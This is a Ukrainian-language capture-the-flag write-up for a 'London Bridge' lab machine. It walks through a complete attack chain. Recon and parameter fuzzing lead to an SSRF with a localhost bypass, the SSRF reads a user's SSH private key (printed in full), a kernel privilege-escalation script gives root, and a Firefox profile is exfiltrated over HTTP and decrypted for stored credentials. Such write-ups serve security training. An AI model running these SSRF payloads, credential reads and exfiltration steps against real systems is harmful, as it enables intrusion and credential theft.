
# The London Bridge - The London Bridge is falling down.

Складність: Medium

Ціль: 10.114.150.99

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
   Первинне сканування мережі виконано за допомогою nmap для виявлення відкритих портів та сервісів.
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.150.99
```
   22,8080

![nmap](./img/nmap.png)

### 1.2. Веб-розвідка:

```bash
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.114.150.99:8080/ -k -t 100 --scan-dir-listings
```

![feroxbuster](./img/feroxbuster.png)

```bash
└─$ curl http://10.114.150.99:8080/gallery
...
</form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>
```

```bash
└─$ curl http://10.114.150.99:8080/dejaview                                                                                                                                                                                                 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    

</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
> -d "image_url=test.txt"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="test.txt" alt="User provided image">


</body>
</html>

└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "image_url=/upload/04.jpg"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="/upload/04.jpg" alt="User provided image">


</body>
</html>
```

```bash
└─$ echo test > test.txt
└─$ python3 -m http.server 80                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
> -d "image_url=http://192.168.130.250/test.txt"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="http://192.168.130.250/test.txt" alt="User provided image">


</body>
</html>
```

На цьому етапі стало зрозуміло, що видимий параметр `image_url` не реалізує описаний у коментарі функціонал імпорту зображень за URL. Це наштовхнуло на припущення, що під час розробки могли залишитися приховані або застарілі параметри, які більше не використовуються інтерфейсом, але все ще обробляються серверною частиною застосунку. Тому було вирішено провести fuzzing назв POST-параметрів, щоб перевірити наявність прихованої функціональності.


```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "FUZZ=/upload/04.jpg" \
-fs 823
```

![ffuf_www.png](./img/ffuf_www.png)

```bash
└─$ python3 -m http.server 80
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-d "www=http://192.168.130.250/test.txt"
test
```

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.112.161.73 - - [23/Jul/2026 12:37:16] "GET /test.txt HTTP/1.1" 200 -
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.0.0.1"               
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

Вмкористаю модифікований під порт 8080 список "Localhost bypass" з (https://highon.coffee/blog/ssrf-cheat-sheet/)
```bash
─$ ffuf \
-w localhost8080_bypass.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://FUZZ" \
-fw 27
```

![ffuf_localhost_bypass.png](./img/ffuf_localhost_bypass.png)

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1"
<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    Build it up with iron bars<br>
    Iron bars, iron bars<br>
    Build it up with iron bars<br>
    My fair lady<br>
    Iron bars will bend and break<br>
    Bend and break, bend and break<br>
    Iron bars will bend and break<br>
    My fair lady<br>
<img height=400px width=600px src="static/2.webp"><br>
<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
    Gold and silver, gold and silver<br>
    Build it up with gold and silver<br>
    My fair lady<br>
    Gold and silver we've not got<br>
    We've not got, we've not got<br>
    Gold and silver we've not got<br>
    My fair lady<br>
<img height=400px width=600px src="static/3.jpg"><br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair beth</font>
</body>
</HTML>
```

```bash
└─$ seq 1 65535 > ports.txt
└─$ ffuf \
-w ports.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:FUZZ" \
-fs 290
```

![fuff_ports](./img/fuff_ports.png)

Тобто:
8080 — вже знайомий зовнішній Gunicorn (Explore London);
80 — новий внутрішній HTTP-сервіс, який доступний тільки через SSRF.

```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/FUZZ" \
-fs 469,1270
```

![ffuf_port80.png](./img/ffuf_port80.png)

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/templates/"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>London Gallery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: wheat;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            grid-gap: 20px;
        }
        .image {
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <h1>London Gallery</h1>
    <div class="container">
        {% for filename in filenames %}
            <img class="image" src="{{ url_for('download_file', filename=filename) }}" alt="{{ filename }}">
        {% endfor %}
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/templates/index.html"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>London Gallery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: wheat;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            grid-gap: 20px;
        }
        .image {
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <h1>London Gallery</h1>
    <div class="container">
        {% for filename in filenames %}
            <img class="image" src="{{ url_for('download_file', filename=filename) }}" alt="{{ filename }}">
        {% endfor %}
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>

└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/templates/base.html" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/uploads/"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /uploads/</title>
</head>
<body>
<h1>Directory listing for /uploads/</h1>
<hr>
<ul>
<li><a href="04.jpg">04.jpg</a></li>
<li><a href="caption.jpg">caption.jpg</a></li>
<li><a href="e3.jpg">e3.jpg</a></li>
<li><a href="images.jpeg">images.jpeg</a></li>
<li><a href="Thames.jpg">Thames.jpg</a></li>
<li><a href="Untitled.png">Untitled.png</a></li>
<li><a href="www.usnews.jpeg">www.usnews.jpeg</a></li>
</ul>
<hr>
</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/static/"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /static/</title>
</head>
<body>
<h1>Directory listing for /static/</h1>
<hr>
<ul>
<li><a href="1.webp">1.webp</a></li>
<li><a href="2.webp">2.webp</a></li>
<li><a href="3.jpg">3.jpg</a></li>
</ul>
<hr>
</body>
</html>
```

```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/FUZZ" \
-fs 469
```

![ffuf_port80_raft](./img/ffuf_port80_raft.png)

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/"  
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /.ssh/</title>
</head>
<body>
<h1>Directory listing for /.ssh/</h1>
<hr>
<ul>
<li><a href="authorized_keys">authorized_keys</a></li>
<li><a href="id_rsa">id_rsa</a></li>
</ul>
<hr>
</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/id_rsa"         
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```

```bash
└─$ ssh -i id_rsa beth@10.114.150.99
```

![ssh](./img/ssh.png)

```bash
beth@london:~$ find / -name "user.txt" 2>/dev/null
/home/beth/__pycache__/user.txt
```

![user_txt](./img/user.txt)

![linpeas_cve.png](./img/linpeas_cve.png)

Copy Fail було обрано як основний вектор експлуатації, оскільки:
* linpeas безпосередньо визначив систему як vulnerable;
* не потребувалось додаткового налаштування kernel modules;
* експлуатація відповідала поточній версії ядра 4.15.0-112-generic.

```bash
beth@london:~$ python3 --version
Python 3.6.9
```

```bash
beth@london:~$ python3 CVE-2026-31431-CopyFail-3.10-.py
# id
uid=0(root) gid=1000(beth) groups=1000(beth)
# 
```

![root.txt](./img/root_txt.png)

```bash
root@london:/home/charles# ls -lah
total 24K
drw------- 3 charles charles 4.0K Apr 23  2024 .
drwxr-xr-x 4 root    root    4.0K Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3.7K Mar 10  2024 .bashrc
drw------- 3 charles charles 4.0K Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
root@london:/home/charles# tar -cvf .mozilla/ mozilla
tar: .mozilla/: Cannot open: Is a directory
tar: Error is not recoverable: exiting now
root@london:/home/charles# tar -cvf mozilla.tgz  .mozilla/
root@london:/home/charles# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
192.168.130.250 - - [23/Jul/2026 05:40:32] "GET /mozilla.tgz HTTP/1.1" 200 -
```

```bash
└─$ wget http://10.114.150.99:81/mozilla.tgz
└─$ sudo tar -xvf mozilla.tgz
└─$ sudo chmod -R 777 .mozilla
└─$ python3 firefox_decrypt.py .mozilla/firefox/8k3bf3zp.charles
```

![firefox_decrypt.png](./img/firefox_decrypt.png)
